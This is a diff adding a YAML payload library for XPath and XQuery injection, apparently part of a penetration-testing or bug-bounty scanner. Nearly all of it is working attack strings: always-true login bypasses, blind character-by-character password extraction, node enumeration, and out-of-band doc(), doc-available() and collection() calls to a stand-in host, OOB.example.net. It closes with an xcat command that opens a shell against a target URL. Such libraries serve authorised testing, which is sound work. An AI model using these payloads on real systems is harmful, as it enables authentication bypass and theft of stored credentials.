@@ -1,0 +1,204 @@
+id: xpath_injection
+name: XPath / XQuery Injection
+version: 1.0.0
+category: injection
+description: |
+  XPath 1.0/2.0 and XQuery injection payloads against authentication and XML
+  search endpoints. Covers always-true filter break, blind extraction, and
+  XPath 2.0 doc()-based OOB exfil.
+mitre:
+  - T1190
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/attacks/XPATH_Injection
+  - https://book.hacktricks.xyz/pentesting-web/xpath-injection
+  - https://owasp.org/www-community/Injection_Theory#xpath-injection
+related_tools:
+  - nuclei
+  - xcat
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: always_true
+    name: Always-true OR
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: critical
+    payload: "' or '1'='1"
+    notes: Classic auth bypass
+    source: https://owasp.org/www-community/attacks/XPATH_Injection
+  - id: always_true_close
+    name: Always-true with close
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: critical
+    payload: "' or 1=1 or ''='"
+    notes: null
+    source: common knowledge
+  - id: empty_attribute
+    name: Empty attribute trick
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "' or '' = '"
+    notes: null
+    source: common knowledge
+  - id: comment_break
+    name: Pseudo comment break
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "admin' or 1=1 or 'a'='"
+    notes: null
+    source: common knowledge
+  - id: blind_substring_a
+    name: Blind substring a
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "' or substring(name(/*[1]),1,1)='a"
+    notes: Iterate alphabet to enumerate XML tree
+    source: https://book.hacktricks.xyz/pentesting-web/xpath-injection
+  - id: blind_password_len
+    name: Blind password length
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "admin' and string-length(password)>5 and '1'='1"
+    notes: null
+    source: common knowledge
+  - id: blind_password_char
+    name: Blind password char extract
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "admin' and substring(password,1,1)='a' and '1'='1"
+    notes: null
+    source: common knowledge
+  - id: count_nodes
+    name: Count nodes
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: medium
+    payload: "' or count(/*) > 0 or ''='"
+    notes: null
+    source: common knowledge
+  - id: oob_doc
+    name: XPath 2.0 doc() OOB
+    subcategory: oob
+    encoding: raw
+    tech_targets: [xpath2]
+    severity_when_works: critical
+    payload: "' or doc('http://OOB.example.net/x') or ''='"
+    notes: Requires XPath 2.0; pingback via DNS/HTTP
+    source: https://book.hacktricks.xyz/pentesting-web/xpath-injection
+  - id: oob_doc_uri
+    name: XPath 2.0 doc-available()
+    subcategory: oob
+    encoding: raw
+    tech_targets: [xpath2]
+    severity_when_works: critical
+    payload: "' or doc-available('http://OOB.example.net/x') or ''='"
+    notes: null
+    source: common knowledge
+  - id: oob_collection
+    name: collection() OOB
+    subcategory: oob
+    encoding: raw
+    tech_targets: [xpath2]
+    severity_when_works: critical
+    payload: "' or collection('http://OOB.example.net/x') or ''='"
+    notes: null
+    source: common knowledge
+  - id: union_xpath
+    name: Union of nodes
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "'] | //user/* | //x['"
+    notes: For pathexpr sinks
+    source: common knowledge
+  - id: cast_function
+    name: name() leak
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: "' or name(parent::*[position()=1])='users' or ''='"
+    notes: null
+    source: common knowledge
+  - id: xquery_let
+    name: XQuery let injection
+    subcategory: xquery
+    encoding: raw
+    tech_targets: [xquery]
+    severity_when_works: high
+    payload: "x' let $x := doc('http://OOB.example.net/x') return '"
+    notes: null
+    source: common knowledge
+  - id: xquery_for
+    name: XQuery for loop
+    subcategory: xquery
+    encoding: raw
+    tech_targets: [xquery]
+    severity_when_works: medium
+    payload: "x' for $x in //user return $x/text() return '"
+    notes: null
+    source: common knowledge
+  - id: numeric_or
+    name: Numeric or 1=1
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: critical
+    payload: "1 or 1=1"
+    notes: For numeric-context filters
+    source: common knowledge
+  - id: blind_codepoint
+    name: codepoints-to-string extraction
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath2]
+    severity_when_works: high
+    payload: "' or string-to-codepoints(password)[1]=97 or ''='"
+    notes: null
+    source: common knowledge
+  - id: blind_position
+    name: position() boolean
+    subcategory: blind
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: medium
+    payload: "' or position()=1 or ''='"
+    notes: null
+    source: common knowledge
+  - id: parent_axis
+    name: Parent-axis traversal
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: medium
+    payload: "']/parent::*/child::*['"
+    notes: null
+    source: common knowledge
+  - id: xcat_invocation
+    name: xcat automation
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [xpath]
+    severity_when_works: high
+    payload: |
+      xcat run --shell https://target.example.net/search 'q=PAYLOAD' --true-string="exists"
+    notes: null
+    source: https://github.com/orf/xcat
